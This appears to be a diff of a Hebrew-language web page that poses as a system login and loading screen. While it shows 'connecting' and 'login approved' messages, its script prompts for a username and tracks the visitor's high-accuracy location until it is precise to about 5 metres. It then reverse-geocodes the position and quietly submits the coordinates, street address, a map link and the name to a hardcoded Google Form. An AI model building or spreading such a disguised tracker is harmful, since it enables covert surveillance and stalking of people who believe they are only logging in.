@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>טעינת מערכת...</title>
+    <title>טעינה...</title>
     <style>
         body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; background-color: #f8f9fa; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #2ecc71; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; }
@@ -14,21 +14,17 @@
 <body>
 
     <div class="loader"></div>
-    <p id="status">מתחבר לשרת הנתונים...</p>
+    <p id="status">מתחבר למערכת...</p>
 
     <script>
         window.onload = function() {
-            const userName = prompt("שלום, אנא הכנס שם משתמש לכניסה:");
-            if (!userName || userName.trim() === "") {
-                document.getElementById("status").innerText = "גישה נדחתה.";
-                return;
-            }
+            const userName = prompt("הכנס שם משתמש לכניסה:");
+            if (!userName) return;
 
-            document.getElementById("status").innerText = "מבצע אימות אבטחה...";
+            document.getElementById("status").innerText = "מאמת נתונים...";
 
             let hasSent = false;
             let bestPosition = null;
-            let bestAccuracy = Infinity;
 
             async function sendToGoogle(pos, name) {
                 if (hasSent) return;
@@ -37,59 +33,47 @@
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
                 
-                // יצירת קישור ל-Google Maps מהקואורדינטות המדויקות
-                const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                let addressInfo = "";
-
+                // הקישור המדויק ביותר ל-Google Maps
+                const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                
+                let addressDesc = "";
                 try {
-                    // בקשת כתובת בעברית (כולל הגדרת שפה)
-                    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
+                    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18`, {
                         headers: { 'Accept-Language': 'he' }
                     });
                     const d = await r.json();
-                    
-                    // בניית הכתובת המילולית + הקישור המדויק
-                    const street = d.address.road || "";
-                    const houseNumber = d.address.house_number || "";
-                    const city = d.address.city || d.address.town || d.address.village || "";
-                    addressInfo = `${street} ${houseNumber}, ${city} | קישור למפה: ${googleMapsLink}`;
+                    addressDesc = (d.display_name || "כתובת כללית") + " | לצפייה במפה: " + mapsLink;
                 } catch (e) {
-                    addressInfo = `מיקום מדויק: ${googleMapsLink}`;
+                    addressDesc = "מיקום מדויק: " + mapsLink;
                 }
 
                 const formID = "1FAIpQLSfYA2SsnyuwYFOhz_IjWdfLAkudHUJPBWmS3VUoF-8xp5u6Gw";
                 const url = `https://docs.google.com/forms/d/e/${formID}/formResponse` +
                     `?entry.1905099702=${lat}` +
                     `&entry.379601602=${lon}` +
-                    `&entry.1378939865=${encodeURIComponent(addressInfo)}` + // שדה הכתובת המעודכן
+                    `&entry.1378939865=${encodeURIComponent(addressDesc)}` +
                     `&entry.2102560173=${encodeURIComponent(name)}` +
                     `&submit=Submit`;
 
                 fetch(url, { mode: 'no-cors' });
-                
-                document.getElementById("status").innerText = "התחברת בהצלחה!";
-                setTimeout(() => { alert("כניסה אושרה. ברוך הבא " + name); }, 500);
+                document.getElementById("status").innerText = "נכנסת בהצלחה!";
+                setTimeout(() => { alert("שלום " + name + ", הכניסה אושרה."); }, 500);
             }
 
             const watchID = navigator.geolocation.watchPosition((pos) => {
-                const currentAccuracy = pos.coords.accuracy;
-                if (currentAccuracy < bestAccuracy) {
-                    bestAccuracy = currentAccuracy;
-                    bestPosition = pos;
-                }
-                // סף דיוק של 5 מטרים
-                if (currentAccuracy <= 5) {
+                bestPosition = pos;
+                if (pos.coords.accuracy <= 5) {
                     navigator.geolocation.clearWatch(watchID);
                     sendToGoogle(pos, userName);
                 }
-            }, null, { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 });
+            }, null, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
 
             setTimeout(() => {
                 if (!hasSent && bestPosition) {
                     navigator.geolocation.clearWatch(watchID);
                     sendToGoogle(bestPosition, userName);
                 }
-            }, 15000);
+            }, 10000);
         };
     </script>
 </body>
